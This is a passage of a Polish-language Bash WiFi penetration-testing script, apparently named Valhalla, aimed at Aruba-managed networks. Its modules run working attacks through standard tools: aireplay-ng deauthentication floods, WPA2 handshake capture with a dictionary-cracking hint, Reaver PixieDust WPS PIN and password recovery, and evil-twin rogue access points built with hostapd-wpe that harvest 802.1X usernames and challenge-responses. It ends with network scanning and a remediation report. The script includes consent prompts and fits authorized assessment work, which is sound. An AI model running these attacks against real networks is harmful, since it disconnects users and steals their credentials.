        log INFO "Wysyłanie ${DEAUTH_COUNT} ramek deauth broadcast..."
        aireplay-ng --deauth "$DEAUTH_COUNT" -a "$selected_bssid" "$MON_IFACE" 2>&1 | tee -a "$LOG_FILE"

        log_result "Deauth_broadcast_${selected_essid}" "INFO" "Broadcast deauth sent, no clients to verify"
    else
        echo -e "\n${BOLD}Klienci na ${selected_essid}:${NC}"
        for i in "${!ap_clients[@]}"; do
            echo -e "  ${CYAN}$((i+1)))${NC} ${ap_clients[$i]}"
        done
        echo -e "  ${CYAN}$((${#ap_clients[@]}+1)))${NC} Broadcast (wszyscy)"

        echo ""
        echo -ne "${YELLOW}[?]${NC} Wybierz klienta [1-$((${#ap_clients[@]}+1))]: "
        read -r client_choice

        local target_client=""
        if [[ "$client_choice" =~ ^[0-9]+$ ]] && (( client_choice <= ${#ap_clients[@]} && client_choice >= 1 )); then
            target_client="${ap_clients[$((client_choice-1))]}"
            log INFO "Cel: klient ${target_client}"
        else
            log INFO "Tryb broadcast (wszyscy klienci)"
        fi

        if ! confirm "Wysłać ${DEAUTH_COUNT} ramek deauth?"; then
            log WARN "Test anulowany."
            press_enter
            return 1
        fi

        if [[ -n "$target_client" ]]; then
            log INFO "Wysyłanie ${DEAUTH_COUNT} ramek deauth do ${target_client}..."
            aireplay-ng --deauth "$DEAUTH_COUNT" -a "$selected_bssid" -c "$target_client" "$MON_IFACE" 2>&1 | tee -a "$LOG_FILE"
        else
            log INFO "Wysyłanie ${DEAUTH_COUNT} ramek deauth broadcast..."
            aireplay-ng --deauth "$DEAUTH_COUNT" -a "$selected_bssid" "$MON_IFACE" 2>&1 | tee -a "$LOG_FILE"
        fi

        echo ""
        log ASK "Obserwuj: czy klienci się rozłączyli i wrócili?"
        echo -e "  ${CYAN}1)${NC} Klient się rozłączył i wrócił (MFP nieaktywne lub słabe)"
        echo -e "  ${CYAN}2)${NC} Klient się NIE rozłączył (MFP chroni / 802.11w aktywne)"
        echo -e "  ${CYAN}3)${NC} Nie jestem pewien / nie widzę"
        echo ""
        echo -ne "${YELLOW}[?]${NC} Wynik obserwacji [1-3]: "
        read -r deauth_result

        case "$deauth_result" in
            1)
                log_result "Deauth_${selected_essid}" "FAIL" "Clients disconnected - vulnerable to deauth"
                AP_MFP["$selected_key"]="disabled"
                echo -e "  ${RED}PODATNE${NC} - Klienci mogą być rozłączani."
                echo -e "  ${DIM}Rekomendacja: Włączyć 802.11w (MFP) na kontrolerze Aruba${NC}"
                ;;
            2)
                log_result "Deauth_${selected_essid}" "PASS" "Clients NOT disconnected - MFP active"
                AP_MFP["$selected_key"]="enabled"
                echo -e "  ${GREEN}CHRONIONE${NC} - MFP/802.11w aktywne, deauth nie działa."
                ;;
            3)
                log_result "Deauth_${selected_essid}" "INFO" "Inconclusive"
                echo -e "  ${YELLOW}NIEOKREŚLONE${NC} - Wynik niejednoznaczny."
                ;;
        esac
    fi

    echo ""
    log OK "Test deautentykacji zakończony."
    press_enter
    return 0
}

# ---------------------------------------------------------------------------
# Moduł 4: Przechwycenie Handshake
# ---------------------------------------------------------------------------

module_handshake() {
    log STEP "MODUŁ 4: PRZECHWYCENIE HANDSHAKE"
    separator

    explain "Próbujemy przechwycić handshake WPA2 (uzgodnienie klucza).
Handshake to wymiana pakietów między klientem a AP podczas
łączenia się z siecią. Przechwycony handshake pozwala:

- Dla WPA2-PSK: testować siłę hasła offline (słownikowo)
- Dla WPA2-Enterprise: zobaczyć wymianę EAPOL/EAP

Metoda: nasłuchujemy na kanale AP, opcjonalnie wysyłamy deauth
aby wymusić ponowne połączenie klienta."

    start_monitor || return 1

    # Select target
    local target_keys=()
    local target_names=()
    for key in "${AP_LIST[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        for target in "${TARGET_SSIDS[@]}"; do
            if [[ "$essid" == "$target" ]]; then
                target_keys+=("$key")
                target_names+=("${essid} (${AP_BSSID[$key]}, ${AP_ENCRYPTION[$key]}, ${AP_AUTH[$key]})")
            fi
        done
    done

    if [[ ${#target_keys[@]} -eq 0 ]]; then
        log WARN "Brak sieci docelowych. Uruchom rekonesans."
        press_enter
        return 1
    fi

    local idx
    idx=$(select_from_list "Wybierz sieć do przechwycenia handshake:" "${target_names[@]}")
    local selected_key="${target_keys[$idx]}"
    local selected_bssid="${AP_BSSID[$selected_key]}"
    local selected_channel="${AP_CHANNEL[$selected_key]}"
    local selected_essid="${AP_BSSID[${selected_key}_essid]}"

    log INFO "Cel: ${selected_essid} (${selected_bssid}) kanał ${selected_channel}"

    local cap_prefix="${RESULTS_DIR}/handshake_${selected_essid}"

    if ! confirm "Rozpocząć przechwytywanie handshake? (max ${HANDSHAKE_TIMEOUT}s)"; then
        log WARN "Anulowano."
        press_enter
        return 1
    fi

    # Start capture on specific channel
    log INFO "Nasłuchiwanie na kanale ${selected_channel}..."
    timeout "$HANDSHAKE_TIMEOUT" airodump-ng \
        --bssid "$selected_bssid" \
        --channel "$selected_channel" \
        --write "$cap_prefix" \
        --output-format pcap \
        "$MON_IFACE" &>/dev/null &
    local capture_pid=$!

    sleep 5

    # Optionally deauth to force reconnection
    if confirm "Wysłać deauth aby wymusić reconnect klienta? (zwiększa szanse)"; then
        log INFO "Wysyłanie ${DEAUTH_COUNT} ramek deauth..."
        aireplay-ng --deauth "$DEAUTH_COUNT" -a "$selected_bssid" "$MON_IFACE" &>/dev/null &
        sleep 3
    fi

    log INFO "Oczekiwanie na handshake (max ${HANDSHAKE_TIMEOUT}s)..."
    wait_with_progress "$HANDSHAKE_TIMEOUT" "Przechwytywanie" "$capture_pid"
    kill "$capture_pid" 2>/dev/null || true
    wait "$capture_pid" 2>/dev/null || true

    # Check for captured handshake
    local cap_file="${cap_prefix}-01.cap"
    if [[ ! -f "$cap_file" ]]; then
        cap_file=$(ls "${cap_prefix}"*.cap 2>/dev/null | head -1 || true)
    fi

    if [[ -f "$cap_file" ]]; then
        log INFO "Sprawdzanie przechwyconego handshake..."

        local hs_check
        hs_check=$(aircrack-ng "$cap_file" 2>&1 || true)

        if echo "$hs_check" | grep -q "1 handshake"; then
            log OK "Handshake przechwycony!"
            echo -e "  ${GREEN}Plik: ${cap_file}${NC}"
            log_result "Handshake_${selected_essid}" "FAIL" "Handshake captured -> offline attack possible"

            echo -e "\n  ${DIM}Handshake można przetestować słownikowo:${NC}"
            echo -e "  ${DIM}aircrack-ng -w <wordlist> ${cap_file}${NC}"
        else
            log WARN "Plik .cap istnieje ale brak kompletnego handshake."
            echo -e "  ${YELLOW}Spróbuj ponownie lub poczekaj na podłączenie klienta.${NC}"
            log_result "Handshake_${selected_essid}" "INFO" "No complete handshake captured"
        fi

        # Check EAPOL for Enterprise
        local eapol_count
        eapol_count=$(tshark -r "$cap_file" -Y "eapol" 2>/dev/null | wc -l || echo "0")
        if [[ "$eapol_count" -gt 0 ]]; then
            log OK "Przechwycono ${eapol_count} ramek EAPOL (Enterprise auth)"
            log_result "EAPOL_${selected_essid}" "INFO" "Captured ${eapol_count} EAPOL frames"
        fi
    else
        log WARN "Nie udało się przechwycić żadnych pakietów."
        log_result "Handshake_${selected_essid}" "INFO" "No capture file generated"
    fi

    echo ""
    log OK "Moduł przechwycenia handshake zakończony."
    press_enter
    return 0
}

# ---------------------------------------------------------------------------
# Moduł 5: Test WPS
# ---------------------------------------------------------------------------

module_wps_test() {
    log STEP "MODUŁ 5: TEST WPS (WiFi Protected Setup)"
    separator

    explain "Testujemy podatność WPS.
WPS to mechanizm ułatwiający łączenie urządzeń z WiFi za
pomocą PIN-u (8 cyfr). Znane podatności:
- PixieDust: pozwala odgadnąć PIN offline w sekundy
- Brute force PIN: tylko 11000 kombinacji (normalnie)

Kontrolery Aruba zazwyczaj nie mają WPS, ale sprawdzamy."

    start_monitor || return 1

    # Check which targets have WPS
    local wps_targets=()
    local wps_names=()

    for key in "${AP_LIST[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        for target in "${TARGET_SSIDS[@]}"; do
            if [[ "$essid" == "$target" ]]; then
                local wps_status="${AP_WPS[$key]:-unknown}"
                if [[ "$wps_status" == "enabled" || "$wps_status" == "unknown" ]]; then
                    wps_targets+=("$key")
                    wps_names+=("${essid} (${AP_BSSID[$key]}) - WPS: ${wps_status}")
                elif [[ "$wps_status" == "disabled" ]]; then
                    echo -e "  ${GREEN}${essid}: WPS wyłączone - BEZPIECZNE${NC}"
                    log_result "WPS_test_${essid}" "PASS" "WPS disabled"
                elif [[ "$wps_status" == "locked" ]]; then
                    echo -e "  ${YELLOW}${essid}: WPS zablokowane${NC}"
                    log_result "WPS_test_${essid}" "INFO" "WPS locked"
                fi
            fi
        done
    done

    if [[ ${#wps_targets[@]} -eq 0 ]]; then
        log OK "Żadna sieć docelowa nie ma aktywnego WPS. Test pominięty."
        press_enter
        return 0
    fi

    if ! confirm "Testować WPS na ${#wps_targets[@]} sieci(ach)?"; then
        log WARN "Test WPS anulowany."
        press_enter
        return 1
    fi

    for i in "${!wps_targets[@]}"; do
        local key="${wps_targets[$i]}"
        local bssid="${AP_BSSID[$key]}"
        local channel="${AP_CHANNEL[$key]}"
        local essid="${AP_BSSID[${key}_essid]}"

        echo ""
        log INFO "Testowanie WPS na ${essid} (${bssid})..."

        # Set channel
        iw dev "$MON_IFACE" set channel "$channel" 2>/dev/null || true

        # PixieDust attack (quick, passive-ish)
        log INFO "Test PixieDust (offline WPS PIN recovery)..."
        local reaver_output="${RESULTS_DIR}/wps_reaver_${essid}.txt"

        timeout "$WPS_TIMEOUT" reaver -i "$MON_IFACE" -b "$bssid" -c "$channel" \
            -vv -K 1 -T 2 -d 0 -L -N \
            2>&1 | tee "$reaver_output" &
        local reaver_pid=$!
        wait_with_progress "$WPS_TIMEOUT" "Test PixieDust" "$reaver_pid"
        kill "$reaver_pid" 2>/dev/null || true
        wait "$reaver_pid" 2>/dev/null || true

        if grep -qi "WPS PIN:" "$reaver_output" 2>/dev/null; then
            local found_pin
            found_pin=$(grep -i "WPS PIN:" "$reaver_output" | head -1)
            echo -e "  ${RED}ZNALEZIONO PIN WPS: ${found_pin}${NC}"
            log_result "WPS_pixie_${essid}" "FAIL" "PixieDust successful: ${found_pin}"
        elif grep -qi "WPA PSK:" "$reaver_output" 2>/dev/null; then
            local found_psk
            found_psk=$(grep -i "WPA PSK:" "$reaver_output" | head -1)
            echo -e "  ${RED}ZNALEZIONO HASŁO: ${found_psk}${NC}"
            log_result "WPS_pixie_${essid}" "FAIL" "Got PSK via PixieDust"
        elif grep -qi "WPS transaction failed" "$reaver_output" 2>/dev/null; then
            echo -e "  ${GREEN}PixieDust nie zadziałał - AP odporne.${NC}"
            log_result "WPS_pixie_${essid}" "PASS" "PixieDust failed"
        else
            echo -e "  ${YELLOW}Brak jednoznacznego wyniku.${NC}"
            log_result "WPS_pixie_${essid}" "INFO" "Inconclusive"
        fi
    done

    echo ""
    log OK "Test WPS zakończony."
    press_enter
    return 0
}

# ---------------------------------------------------------------------------
# Moduł 6: Evil Twin / Rogue AP
# ---------------------------------------------------------------------------

module_evil_twin() {
    log STEP "MODUŁ 6: EVIL TWIN / ROGUE AP"
    separator

    explain "Testujemy odporność na atak 'Evil Twin' (fałszywy AP).
Tworzymy fałszywy punkt dostępowy z taką samą nazwą jak
sieć docelowa. Sprawdzamy:

- Czy klienci automatycznie łączą się z fałszywym AP?
- Czy WPA2-Enterprise blokuje połączenie z rogue AP?
- Czy użytkownicy zobaczą ostrzeżenie o certyfikacie?

DLA SIECI ENTERPRISE (802.1X):
Używamy hostapd-wpe do przechwycenia próby uwierzytelnienia.

UWAGA: To test agresywny - wymaga potwierdzenia!"

    echo -e "${RED}${BOLD}"
    echo "  ╔════════════════════════════════════════════════╗"
    echo "  ║  OSTRZEŻENIE: Evil Twin może zakłócić usługi  ║"
    echo "  ║  Upewnij się, że masz zgodę na ten test!      ║"
    echo "  ╚════════════════════════════════════════════════╝"
    echo -e "${NC}"

    if ! confirm "Czy na pewno chcesz uruchomić test Evil Twin?"; then
        log WARN "Evil Twin anulowany."
        press_enter
        return 1
    fi

    # Select target
    local target_keys=()
    local target_names=()
    for key in "${AP_LIST[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        for target in "${TARGET_SSIDS[@]}"; do
            if [[ "$essid" == "$target" ]]; then
                target_keys+=("$key")
                target_names+=("${essid} (${AP_ENCRYPTION[$key]} / ${AP_AUTH[$key]})")
            fi
        done
    done

    if [[ ${#target_keys[@]} -eq 0 ]]; then
        log WARN "Brak sieci docelowych. Uruchom rekonesans."
        press_enter
        return 1
    fi

    local idx
    idx=$(select_from_list "Wybierz sieć do testu Evil Twin:" "${target_names[@]}")
    local selected_key="${target_keys[$idx]}"
    local selected_bssid="${AP_BSSID[$selected_key]}"
    local selected_channel="${AP_CHANNEL[$selected_key]}"
    local selected_essid="${AP_BSSID[${selected_key}_essid]}"
    local selected_auth="${AP_AUTH[$selected_key]}"

    log INFO "Cel: ${selected_essid} (kanał ${selected_channel})"

    # Determine attack type based on auth
    if [[ "$selected_auth" == *"MGT"* || "$selected_auth" == *"802.1X"* ]]; then
        evil_twin_enterprise "$selected_essid" "$selected_channel"
    else
        evil_twin_psk "$selected_essid" "$selected_channel"
    fi

    press_enter
    return 0
}

evil_twin_psk() {
    local essid="$1"
    local channel="$2"

    log INFO "Test Evil Twin PSK dla: ${essid}"

    if ! command -v hostapd &>/dev/null && ! command -v hostapd-wpe &>/dev/null; then
        log ERROR "Brak hostapd/hostapd-wpe. Zainstaluj: apt install hostapd-wpe"
        return 1
    fi

    stop_monitor

    # Create hostapd config for open rogue AP
    local conf_file="${RESULTS_DIR}/evil_twin_${essid}.conf"
    cat > "$conf_file" << EOFCONF
interface=${WIFI_IFACE}
driver=nl80211
ssid=${essid}
hw_mode=g
channel=${channel}
wmm_enabled=0
auth_algs=1
wpa=0
EOFCONF

    log INFO "Uruchamiam fałszywy AP: ${essid} (otwarty) na kanale ${channel}..."
    log WARN "Monitoruję przez ${EVILTWIN_TIMEOUT}s..."

    local et_log="${RESULTS_DIR}/evil_twin_${essid}.log"
    hostapd "$conf_file" > "$et_log" 2>&1 &
    local et_pid=$!
    sleep 2

    if ! kill -0 "$et_pid" 2>/dev/null; then
        log ERROR "Nie udało się uruchomić fałszywego AP."
        log WARN "Sprawdź: czy interfejs ${WIFI_IFACE} nie jest w trybie monitor?"
        cat "$et_log" 2>/dev/null
        return 1
    fi

    log OK "Fałszywy AP uruchomiony!"
    wait_with_progress "$EVILTWIN_TIMEOUT" "Evil Twin aktywny" "$et_pid"

    kill "$et_pid" 2>/dev/null || true
    wait "$et_pid" 2>/dev/null || true

    # Analyze results
    local connections
    connections=$(grep -c "AP-STA-CONNECTED" "$et_log" 2>/dev/null || echo "0")

    if [[ "$connections" -gt 0 ]]; then
        echo -e "  ${RED}${connections} klient(ów) połączyło się z fałszywym AP!${NC}"
        log_result "EvilTwin_${essid}" "FAIL" "${connections} clients connected to rogue AP"
        echo -e "  ${DIM}Rekomendacja: Wdrożyć WIDS/WIPS, edukacja użytkowników${NC}"
    else
        echo -e "  ${GREEN}Żaden klient nie połączył się z fałszywym AP.${NC}"
        log_result "EvilTwin_${essid}" "PASS" "No clients connected to rogue AP"
    fi

    log OK "Test Evil Twin PSK zakończony."
}

evil_twin_enterprise() {
    local essid="$1"
    local channel="$2"

    log INFO "Test Evil Twin Enterprise (802.1X) dla: ${essid}"

    if ! command -v hostapd-wpe &>/dev/null; then
        log ERROR "hostapd-wpe niedostępny. Zainstaluj: apt install hostapd-wpe"
        return 1
    fi

    stop_monitor

    # Check for hostapd-wpe config
    local wpe_base="/etc/hostapd-wpe/hostapd-wpe.conf"
    if [[ ! -f "$wpe_base" ]]; then
        wpe_base="/etc/hostapd-wpe.conf"
    fi

    if [[ ! -f "$wpe_base" ]]; then
        log ERROR "Brak konfiguracji hostapd-wpe w /etc/"
        return 1
    fi

    local conf_file="${RESULTS_DIR}/evil_twin_wpe_${essid}.conf"
    cp "$wpe_base" "$conf_file"

    # Modify config
    sed -i "s/^ssid=.*/ssid=${essid}/" "$conf_file"
    sed -i "s/^interface=.*/interface=${WIFI_IFACE}/" "$conf_file"
    sed -i "s/^channel=.*/channel=${channel}/" "$conf_file"

    log INFO "Uruchamiam fałszywy AP Enterprise: ${essid} na kanale ${channel}..."
    log WARN "hostapd-wpe przechwyci próby uwierzytelnienia 802.1X"

    local wpe_log="${RESULTS_DIR}/evil_twin_wpe_${essid}.log"
    hostapd-wpe "$conf_file" > "$wpe_log" 2>&1 &
    local wpe_pid=$!
    sleep 3

    if ! kill -0 "$wpe_pid" 2>/dev/null; then
        log ERROR "Nie udało się uruchomić hostapd-wpe."
        cat "$wpe_log" 2>/dev/null | tail -5
        return 1
    fi

    log OK "Fałszywy AP Enterprise uruchomiony!"
    wait_with_progress "$EVILTWIN_TIMEOUT" "Evil Twin WPE aktywny" "$wpe_pid"

    kill "$wpe_pid" 2>/dev/null || true
    wait "$wpe_pid" 2>/dev/null || true

    # Analyze captured credentials
    local creds_found=0
    if grep -qi "username:" "$wpe_log" 2>/dev/null; then
        creds_found=$(grep -ci "username:" "$wpe_log" 2>/dev/null || echo "0")
        echo -e "\n  ${RED}Przechwycono ${creds_found} próby uwierzytelnienia!${NC}"
        echo -e "  ${RED}Użytkownicy wysłali dane logowania do fałszywego AP!${NC}"
        grep -i "username:\|challenge:\|response:" "$wpe_log" 2>/dev/null | head -20 | while read -r line; do
            echo -e "  ${YELLOW}  ${line}${NC}"
        done
        log_result "EvilTwin_WPE_${essid}" "FAIL" "Captured ${creds_found} credential attempts"
        echo -e "\n  ${DIM}Rekomendacja: Weryfikacja certyfikatu serwera RADIUS po stronie klienta${NC}"
        echo -e "  ${DIM}Rekomendacja: Wdrożenie WIDS/WIPS, alerty na rogue AP${NC}"
    else
        echo -e "  ${GREEN}Brak przechwyconych danych uwierzytelniania.${NC}"
        log_result "EvilTwin_WPE_${essid}" "PASS" "No credentials captured"
    fi

    # Copy log for report
    cp "$wpe_log" "${RESULTS_DIR}/wpe_credentials_${essid}.txt" 2>/dev/null || true

    log OK "Test Evil Twin Enterprise zakończony."
}

# ---------------------------------------------------------------------------
# Moduł 7: Test izolacji klientów
# ---------------------------------------------------------------------------

module_client_isolation() {
    log STEP "MODUŁ 7: TEST IZOLACJI KLIENTÓW"
    separator

    explain "Testujemy izolację klientów w sieci.
Sprawdzamy, czy podłączone urządzenia mogą:

- Widzieć się nawzajem w sieci (ARP scan)
- Komunikować się bezpośrednio (peer-to-peer)
- Dostać się do interfejsów zarządzania (gateway, AP)
- Dotrzeć do innych VLAN-ów

Ten test wymaga PODŁĄCZENIA się do sieci docelowej.
Potrzebne jest hasło lub dane 802.1X."

    # Need to be in managed mode
    if [[ $MONITOR_ACTIVE -eq 1 ]]; then
        log INFO "Wyłączam tryb monitor (potrzebny tryb managed)..."
        stop_monitor
    fi

    echo -e "\n${BOLD}Aby przeprowadzić ten test, musisz się połączyć z siecią.${NC}"
    echo -e "${DIM}Użyj Network Manager lub nmcli do połączenia.${NC}"
    echo ""

    local target_net=""
    for target in "${TARGET_SSIDS[@]}"; do
        echo -e "  ${CYAN}-${NC} ${target}"
    done

    echo ""
    echo -ne "${YELLOW}[?]${NC} Z którą siecią jesteś połączony? (wpisz SSID lub 'skip'): "
    read -r target_net

    if [[ "$target_net" == "skip" || -z "$target_net" ]]; then
        log WARN "Test izolacji pominięty."
        log_result "Izolacja" "SKIP" "User skipped"
        press_enter
        return 0
    fi

    # Detect current IP and gateway
    local current_ip current_gw current_iface subnet
    current_iface=$(ip route 2>/dev/null | grep default | awk '{print $5}' | head -1)
    current_ip=$(ip -4 addr show "$current_iface" 2>/dev/null | grep "inet " | awk '{print $2}' | head -1)
    current_gw=$(ip route 2>/dev/null | grep default | awk '{print $3}' | head -1)
    subnet=$(echo "$current_ip" | sed 's|\.[0-9]*/.*|.0/24|')

    if [[ -z "$current_ip" || -z "$current_gw" ]]; then
        log ERROR "Nie mogę wykryć IP lub bramy. Czy na pewno jesteś połączony?"
        press_enter
        return 1
    fi

    log OK "Interfejs: ${current_iface}"
    log OK "IP: ${current_ip}"
    log OK "Brama: ${current_gw}"
    log OK "Podsieć: ${subnet}"

    # Test 1: ARP scan
    echo ""
    log INFO "Test 1: Skanowanie ARP (wykrywanie innych klientów)..."

    local arp_file="${RESULTS_DIR}/isolation_arp_${target_net}.txt"

    if command -v arp-scan &>/dev/null; then
        arp-scan -l --interface="$current_iface" 2>/dev/null > "$arp_file" || true
    else
        nmap -sn "$subnet" -oN "$arp_file" 2>/dev/null || true
    fi

    local host_count
    host_count=$(grep -cE "([0-9]{1,3}\.){3}[0-9]{1,3}" "$arp_file" 2>/dev/null || echo "0")
    # Subtract self and gateway
    host_count=$((host_count > 2 ? host_count - 2 : 0))

    if [[ "$host_count" -gt 0 ]]; then
        echo -e "  ${RED}Znaleziono ${host_count} innych hostów w sieci!${NC}"
        echo -e "  ${DIM}Klienci mogą się widzieć - brak izolacji Layer 2.${NC}"
        log_result "Izolacja_L2_${target_net}" "FAIL" "${host_count} other hosts visible"
    else
        echo -e "  ${GREEN}Brak widocznych innych hostów - izolacja L2 aktywna.${NC}"
        log_result "Izolacja_L2_${target_net}" "PASS" "No other hosts visible"
    fi

    # Test 2: Gateway management ports
    echo ""
    log INFO "Test 2: Dostęp do portów zarządzania bramy (${current_gw})..."

    local mgmt_file="${RESULTS_DIR}/isolation_mgmt_${target_net}.txt"
    nmap -Pn -p "$MGMT_PORTS" "$current_gw" -oN "$mgmt_file" 2>/dev/null || true

    local open_ports
    open_ports=$(grep -c "open" "$mgmt_file" 2>/dev/null || echo "0")

    if [[ "$open_ports" -gt 0 ]]; then
        echo -e "  ${RED}Znaleziono ${open_ports} otwartych portów zarządzania na bramie!${NC}"
        grep "open" "$mgmt_file" 2>/dev/null | while read -r line; do
            echo -e "    ${YELLOW}${line}${NC}"
        done
        log_result "Mgmt_access_${target_net}" "FAIL" "${open_ports} management ports open on gateway"
        echo -e "  ${DIM}Rekomendacja: Zablokować dostęp do portów zarządzania z VLAN gościnnego${NC}"
    else
        echo -e "  ${GREEN}Porty zarządzania na bramie niedostępne.${NC}"
        log_result "Mgmt_access_${target_net}" "PASS" "Management ports blocked"
    fi

    # Test 3: Common management IPs
    echo ""
    log INFO "Test 3: Skanowanie typowych adresów zarządzania..."

    local common_mgmt=("10.0.0.1" "10.0.1.1" "192.168.1.1" "192.168.0.1" "172.16.0.1")
    for mgmt_ip in "${common_mgmt[@]}"; do
        if ping -c 1 -W 1 "$mgmt_ip" &>/dev/null; then
            echo -e "  ${RED}Osiągalny: ${mgmt_ip}${NC}"
            log_result "VLAN_leak_${mgmt_ip}" "FAIL" "Management IP ${mgmt_ip} reachable from ${target_net}"
        fi
    done

    # Test 4: Internet access
    echo ""
    log INFO "Test 4: Dostęp do Internetu..."
    if ping -c 2 -W 3 8.8.8.8 &>/dev/null; then
        echo -e "  ${GREEN}Internet dostępny.${NC}"
        log_result "Internet_${target_net}" "INFO" "Internet access available"
    else
        echo -e "  ${YELLOW}Brak dostępu do Internetu.${NC}"
        log_result "Internet_${target_net}" "INFO" "No internet access"
    fi

    echo ""
    log OK "Test izolacji klientów zakończony."
    press_enter
    return 0
}

# ---------------------------------------------------------------------------
# Moduł 8: Generowanie raportu
# ---------------------------------------------------------------------------

module_report() {
    log STEP "MODUŁ 8: GENEROWANIE RAPORTU"
    separator

    local report_file="${RESULTS_DIR}/raport_wifi_$(date '+%Y-%m-%d').txt"

    {
        echo "================================================================"
        echo " RAPORT Z TESTU PENETRACYJNEGO SIECI WiFi"
        echo " Valhalla WiFi Pentest Tool v${VERSION}"
        echo "================================================================"
        echo ""
        echo "Data:              $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Operator:          $(whoami)@$(hostname)"
        echo "Interfejs:         ${WIFI_IFACE}"
        echo "Sieci docelowe:    ${TARGET_SSIDS[*]}"
        echo "Priorytet:         ${PRIMARY_SSIDS[*]}"
        echo ""
        echo "================================================================"
        echo " PODSUMOWANIE WYNIKÓW"
        echo "================================================================"
        echo ""

        local pass_count=0
        local fail_count=0
        local info_count=0

        for test_name in $(echo "${!TEST_RESULTS[@]}" | tr ' ' '\n' | sort); do
            local result="${TEST_RESULTS[$test_name]}"
            printf "  %-45s %s\n" "${test_name}" "[${result}]"
            case "$result" in
                PASS) ((pass_count++)) ;;
                FAIL) ((fail_count++)) ;;
                *) ((info_count++)) ;;
            esac
        done

        echo ""
        echo "  Łącznie: PASS=${pass_count}  FAIL=${fail_count}  INFO/SKIP=${info_count}"
        echo ""
        echo "================================================================"
        echo " ZNALEZIONE SIECI DOCELOWE"
        echo "================================================================"
        echo ""

        for key in "${AP_LIST[@]}"; do
            local essid="${AP_BSSID[${key}_essid]}"
            for target in "${TARGET_SSIDS[@]}"; do
                if [[ "$essid" == "$target" ]]; then
                    echo "  SSID:        ${essid}"
                    echo "  BSSID:       ${AP_BSSID[$key]}"
                    echo "  Kanał:       ${AP_CHANNEL[$key]}"
                    echo "  Szyfrowanie: ${AP_ENCRYPTION[$key]}"
                    echo "  Szyfr:       ${AP_CIPHER[$key]}"
                    echo "  Auth:        ${AP_AUTH[$key]}"
                    echo "  Sygnał:      ${AP_POWER[$key]}dBm"
                    echo "  Klienci:     ${AP_CLIENTS[$key]}"
                    echo "  WPS:         ${AP_WPS[$key]:-nieznany}"
                    echo "  MFP/802.11w: ${AP_MFP[$key]:-nieznany}"
                    echo ""
                fi
            done
        done

        echo "================================================================"
        echo " REKOMENDACJE"
        echo "================================================================"
        echo ""

        local has_recommendations=0

        for test_name in "${!TEST_RESULTS[@]}"; do
            if [[ "${TEST_RESULTS[$test_name]}" == "FAIL" ]]; then
                has_recommendations=1
                case "$test_name" in
                    Deauth_*)
                        echo "  [!] DEAUTENTYKACJA: Włącz 802.11w (MFP) w konfiguracji"
                        echo "      kontrolera Aruba dla sieci ${test_name#Deauth_}."
                        echo "      Management Frame Protection zapobiega atakom deauth."
                        echo ""
                        ;;
                    Handshake_*)
                        echo "  [!] HANDSHAKE: Możliwy atak słownikowy offline na"
                        echo "      sieć ${test_name#Handshake_}. Upewnij się, że hasło"
                        echo "      jest złożone (min. 20 znaków, losowe)."
                        echo "      Rozważ migrację na WPA2-Enterprise lub WPA3-SAE."
                        echo ""
                        ;;
                    WPS_*)
                        echo "  [!] WPS: Wyłącz WPS na sieci ${test_name#WPS_*_}."
                        echo "      WPS stanowi poważne zagrożenie bezpieczeństwa."
                        echo ""
                        ;;
                    EvilTwin_*)
                        echo "  [!] EVIL TWIN: Sieć ${test_name#EvilTwin_*_} jest podatna"
                        echo "      na atak Evil Twin. Rekomendacje:"
                        echo "      - Wdrożyć WIDS/WIPS (Wireless IDS/IPS)"
                        echo "      - Weryfikacja certyfikatu serwera RADIUS na klientach"
                        echo "      - Szkolenie użytkowników z zagrożeń WiFi"
                        echo ""
                        ;;
                    Izolacja_*)
                        echo "  [!] IZOLACJA: Brak izolacji klientów w sieci"
                        echo "      ${test_name#Izolacja_*_}. Włącz Client Isolation"
                        echo "      w konfiguracji kontrolera Aruba."
                        echo ""
                        ;;
                    Mgmt_access_*)
                        echo "  [!] ZARZĄDZANIE: Porty zarządzania dostępne z sieci"
                        echo "      ${test_name#Mgmt_access_}. Zablokuj dostęp ACL-ami."
                        echo ""
                        ;;
                    PMKID*)
                        echo "  [!] PMKID: Sieć podatna na atak PMKID."
                        echo "      Rozważ WPA3-SAE lub wyłącz PMKID w konfiguracji AP."
                        echo ""
                        ;;
                    Szyfrowanie_*)
                        echo "  [!] SZYFROWANIE: Słabe szyfrowanie na sieci"
                        echo "      ${test_name#Szyfrowanie_}. Migruj na WPA2/WPA3."
                        echo ""
                        ;;
                esac
            fi
        done

        if [[ $has_recommendations -eq 0 ]]; then
            echo "  Brak krytycznych rekomendacji. Sieci wyglądają na dobrze"
            echo "  zabezpieczone w testowanym zakresie."
        fi

        echo ""
        echo "================================================================"
        echo " PLIKI WYNIKOWE"
        echo "================================================================"
        echo ""
        echo "  Katalog wyników: ${RESULTS_DIR}"
        echo ""
        ls -la "$RESULTS_DIR" 2>/dev/null | while read -r line; do
            echo "  ${line}"
        done

        echo ""
        echo "================================================================"
        echo " PEŁNY LOG"
        echo "================================================================"
        echo ""
        cat "$LOG_FILE" 2>/dev/null

        echo ""
        echo "================================================================"
        echo " KONIEC RAPORTU"
        echo " Wygenerowano: $(date '+%Y-%m-%d %H:%M:%S')"
        echo " Valhalla WiFi Pentest Tool v${VERSION}"
        echo "================================================================"
    } > "$report_file"

    log OK "Raport zapisany: ${report_file}"
    echo ""
    echo -e "${BOLD}Podsumowanie:${NC}"

    local pass_count=0 fail_count=0
    for result in "${TEST_RESULTS[@]}"; do
        [[ "$result" == "PASS" ]] && ((pass_count++))
        [[ "$result" == "FAIL" ]] && ((fail_count++))
    done

    echo -e "  ${GREEN}PASS: ${pass_count}${NC}"
    echo -e "  ${RED}FAIL: ${fail_count}${NC}"
    echo -e "  Łącznie testów: ${#TEST_RESULTS[@]}"
    echo ""
    echo -e "${CYAN}Plik raportu: ${report_file}${NC}"
    echo -e "${CYAN}Katalog:      ${RESULTS_DIR}${NC}"

    press_enter
    return 0
}

# ---------------------------------------------------------------------------
# Menu główne
# ---------------------------------------------------------------------------

show_menu() {
    clear
    banner

    echo -e "${BOLD}Interfejs: ${CYAN}${WIFI_IFACE}${NC}"
    if [[ $MONITOR_ACTIVE -eq 1 ]]; then
        echo -e "${BOLD}Monitor:   ${GREEN}${MON_IFACE} (aktywny)${NC}"
    else
        echo -e "${BOLD}Monitor:   ${GRAY}nieaktywny${NC}"
    fi
    echo -e "${BOLD}Wyniki:    ${DIM}${RESULTS_DIR}${NC}"
